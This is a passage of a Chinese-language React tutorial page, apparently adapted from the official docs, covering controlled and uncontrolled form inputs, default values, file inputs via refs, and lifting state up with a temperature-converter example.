class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Reservation</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<br>      <span class="hljs-attr">isGoing</span>: <span class="hljs-literal">true</span>,<br>      <span class="hljs-attr">numberOfGuests</span>: <span class="hljs-number">2</span><br>    &#125;;<br><br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleInputChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleInputChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleInputChange</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>;<br>    <span class="hljs-keyword">const</span> value = target.<span class="hljs-property">name</span> === <span class="hljs-string">&#x27;isGoing&#x27;</span> ? target.<span class="hljs-property">checked</span> : target.<span class="hljs-property">value</span>;<br>    <span class="hljs-keyword">const</span> name = target.<span class="hljs-property">name</span>;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>      [name]: value    &#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          参与:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;isGoing&quot;</span>            <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;checkbox&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">checked</span>=<span class="hljs-string">&#123;this.state.isGoing&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleInputChange&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          来宾人数:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;numberOfGuests&quot;</span>            <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;this.state.numberOfGuests&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleInputChange&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里使用了 ES6 <a href="https://developer.mozilla.org/en/docs/Web/JavaScript/Reference/Operators/Object_initializer#Computed_property_names">计算属性名称</a>的语法更新给定输入名称对应的 state 值：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<br>  [name]: value<br>&#125;);<br></code></pre></td></tr></table></figure><p>另外，由于 <code>setState()</code> 自动[将部分 state 合并到当前 state，只需调用它更改部分 state 即可。</p><p><strong>受控输入空值</strong></p><p>在<a href="https://react.docschina.org/docs/forms.html#controlled-components">受控组件</a>上指定 value 的 prop 会阻止用户更改输入。如果你指定了 <code>value</code>，但输入仍可编辑，则可能是你意外地将<code>value</code> 设置为 <code>undefined</code> 或 <code>null</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;hi&quot;</span> /&gt;</span></span>, mountNode);<br><br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;null&#125;</span> /&gt;</span></span>, mountNode);<br>&#125;, <span class="hljs-number">1000</span>);<br></code></pre></td></tr></table></figure><p><strong>受控组件的替代品</strong></p><p>有时使用受控组件会很麻烦，因为你需要为数据变化的每种方式都编写事件处理函数，并通过一个 React 组件传递所有的输入 state。当你将之前的代码库转换为 React 或将 React 应用程序与非 React 库集成时，这可能会令人厌烦。在这些情况下，你可能希望使用&#x3D;&#x3D;非受控组件&#x3D;&#x3D;，这是实现输入表单的另一种方式。</p><p><strong>成熟的解决方案</strong></p><p>如果你想寻找包含验证、追踪访问字段以及处理表单提交的完整解决方案，使用 <a href="https://jaredpalmer.com/formik">Formik</a> 是不错的选择。然而，它也是建立在受控组件和管理 state 的基础之上 —— 所以不要忽视学习它们。</p><p><strong>&#x3D;&#x3D;非受控组件&#x3D;&#x3D;</strong></p><p>在大多数情况下，我们推荐使用 <a href="https://react.docschina.org/docs/forms.html#controlled-components">受控组件</a> 来处理表单数据。在一个受控组件中，表单数据是由 React 组件来管理的。另一种替代方案是使用非受控组件，这时表单数据将交由 DOM 节点来处理。</p><p>要编写一个非受控组件，而不是为每个状态更新都编写数据处理函数，你可以 <a href="https://react.docschina.org/docs/refs-and-the-dom.html">使用 ref</a> 来从 DOM 节点中获取表单数据。</p><p>例如，下面的代码使用非受控组件接受一个表单的值：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NameForm</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">input</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createRef</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) &#123;<br>    <span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;A name was submitted: &#x27;</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">input</span>.<span class="hljs-property">current</span>.<span class="hljs-property">value</span>);<br>    event.<span class="hljs-title function_">preventDefault</span>();<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          Name:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.input&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为非受控组件将真实数据储存在 DOM 节点中，所以在使用非受控组件时，有时候反而更容易同时集成 React 和非 React 代码。如果你不介意代码美观性，并且希望快速编写代码，使用非受控组件往往可以减少你的代码量。否则，你应该使用受控组件。</p><p>如果你还是不清楚在某个特殊场景中应该使用哪种组件，那么 <a href="https://goshakkk.name/controlled-vs-uncontrolled-inputs-react/">这篇关于受控和非受控输入组件的文章</a> 会很有帮助。</p><p><strong>默认值</strong></p><p>在 React 渲染生命周期时，表单元素上的 <code>value</code> 将会覆盖 DOM 节点中的值，在非受控组件中，你经常希望 React 能赋予组件一个初始值，但是不去控制后续的更新。 在这种情况下, 你可以指定一个 <code>defaultValue</code> 属性，而不是 <code>value</code>。</p><p>同样，<code>&lt;input type=&quot;checkbox&quot;&gt;</code> 和 <code>&lt;input type=&quot;radio&quot;&gt;</code> 支持 <code>defaultChecked</code>，<code>&lt;select&gt;</code> 和 <code>&lt;textarea&gt;</code> 支持 <code>defaultValue</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        Name:</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">defaultValue</span>=<span class="hljs-string">&quot;Bob&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.input&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p>在 React 中，<code>&lt;input type=&quot;file&quot; /&gt;</code> 始终是一个非受控组件，因为它的值只能由用户设置，而不能通过代码控制。</p><p>您应该使用 File API 与文件进行交互。下面的例子显示了如何创建一个 <a href="https://react.docschina.org/docs/refs-and-the-dom.html">DOM 节点的 ref</a> 从而在提交表单时获取文件的信息。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleSubmit</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">fileInput</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createRef</span>();<br>  &#125;<br>  <span class="hljs-title function_">handleSubmit</span>(<span class="hljs-params">event</span>) &#123;<br>    event.<span class="hljs-title function_">preventDefault</span>();<br>    <span class="hljs-title function_">alert</span>(<br>      <span class="hljs-string">`Selected file - <span class="hljs-subst">$&#123;<span class="hljs-variable language_">this</span>.fileInput.current.files[<span class="hljs-number">0</span>].name&#125;</span>`</span><br>    );<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">&#123;this.handleSubmit&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">          Upload file:</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&#123;this.fileInput&#125;</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span>Submit<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br><br><span class="hljs-title class_">ReactDOM</span>.<span class="hljs-title function_">render</span>(<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FileInput</span> /&gt;</span></span>,<br>  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;root&#x27;</span>)<br>)<br></code></pre></td></tr></table></figure><h3 id="25-状态提升"><a href="#25-状态提升" class="headerlink" title="25.状态提升"></a>25.状态提升</h3><p>通常，多个组件需要反映相同的变化数据，这时我们建议将共享状态提升到最近的共同父组件中去。</p><p>如下情况：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">function</span> <span class="hljs-title function_">BoilingVerdict</span>(<span class="hljs-params">props</span>) &#123;<br>  <span class="hljs-keyword">if</span> (props.<span class="hljs-property">celsius</span> &gt;= <span class="hljs-number">100</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The water would boil.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;  &#125;<br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The water would not boil.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">const</span> scaleNames = &#123;<br>  <span class="hljs-attr">c</span>: <span class="hljs-string">&#x27;Celsius&#x27;</span>,<br>  <span class="hljs-attr">f</span>: <span class="hljs-string">&#x27;Fahrenheit&#x27;</span><br>&#125;;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TemperatureInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">temperature</span>: <span class="hljs-string">&#x27;&#x27;</span>&#125;;<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">temperature</span>: e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>&#125;);<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> temperature = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">temperature</span>;<br>    <span class="hljs-keyword">const</span> scale = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">scale</span>;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>Enter temperature in &#123;scaleNames[scale]&#125;:<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">               <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们现在可以修改 <code>Calculator</code> 组件让它渲染两个独立的温度输入框组件：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">&quot;c&quot;</span> /&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span> <span class="hljs-attr">scale</span>=<span class="hljs-string">&quot;f&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们现在有了两个输入框，但当你在其中一个输入温度时，另一个并不会更新。这与我们的要求相矛盾：我们希望让它们保持同步。</p><p>另外，我们也不能通过 <code>Calculator</code> 组件展示 <code>BoilingVerdict</code> 组件的渲染结果。因为 <code>Calculator</code> 组件并不知道隐藏在 <code>TemperatureInput</code> 组件中的当前温度是多少。</p><p>在 React 中，将多个组件中需要共享的 state 向上移动到它们的最近共同父组件中，便可实现共享 state。这就是所谓的“状态提升”。接下来，我们将 <code>TemperatureInput</code> 组件中的 state 移动至 <code>Calculator</code> 组件中去。</p><p>如果 <code>Calculator</code> 组件拥有了共享的 state，它将成为两个温度输入框中当前温度的“数据源”。它能够使得两个温度输入框的数值彼此保持一致。由于两个 <code>TemperatureInput</code> 组件的 props 均来自共同的父组件 <code>Calculator</code>，因此两个输入框中的内容将始终保持一致。</p><p>修改后：</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">TemperatureInput</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">handleChange</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-title function_">onTemperatureChange</span>(e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>);<br>  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> temperature = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">temperature</span>;<br>    <span class="hljs-keyword">const</span> scale = <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">scale</span>;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">legend</span>&gt;</span>Enter temperature in &#123;scaleNames[scale]&#125;:<span class="hljs-tag">&lt;/<span class="hljs-name">legend</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;temperature&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">               <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;this.handleChange&#125;</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span></span><br>    );<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs jsx"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Calculator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">React.Component</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">props</span>) &#123;<br>    <span class="hljs-variable language_">super</span>(props);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleCelsiusChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleCelsiusChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleFahrenheitChange</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">handleFahrenheitChange</span>.<span class="hljs-title function_">bind</span>(<span class="hljs-variable language_">this</span>);<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span> = &#123;<span class="hljs-attr">temperature</span>: <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-attr">scale</span>: <span class="hljs-string">&#x27;c&#x27;</span>&#125;;  &#125;<br><br>  <span class="hljs-title function_">handleCelsiusChange</span>(<span class="hljs-params">temperature</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">scale</span>: <span class="hljs-string">&#x27;c&#x27;</span>, temperature&#125;);  &#125;<br><br>  <span class="hljs-title function_">handleFahrenheitChange</span>(<span class="hljs-params">temperature</span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setState</span>(&#123;<span class="hljs-attr">scale</span>: <span class="hljs-string">&#x27;f&#x27;</span>, temperature&#125;);  &#125;<br><br>  <span class="hljs-title function_">render</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">const</span> scale = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">scale</span>;    <span class="hljs-keyword">const</span> temperature = <span class="hljs-variable language_">this</span>.<span class="hljs-property">state</span>.<span class="hljs-property">temperature</span>;    <span class="hljs-keyword">const</span> celsius = scale === <span class="hljs-string">&#x27;f&#x27;</span> ? <span class="hljs-title function_">tryConvert</span>(temperature, toCelsius) : temperature;    <span class="hljs-keyword">const</span> fahrenheit = scale === <span class="hljs-string">&#x27;c&#x27;</span> ? <span class="hljs-title function_">tryConvert</span>(temperature, toFahrenheit) : temperature;<br>    <span class="hljs-keyword">return</span> (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">TemperatureInput</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">scale</span>=<span class="hljs-string">&quot;c&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          <span class="hljs-attr">temperature</span>=<span class="hljs-string">&#123;celsius&#125;</span>          <span 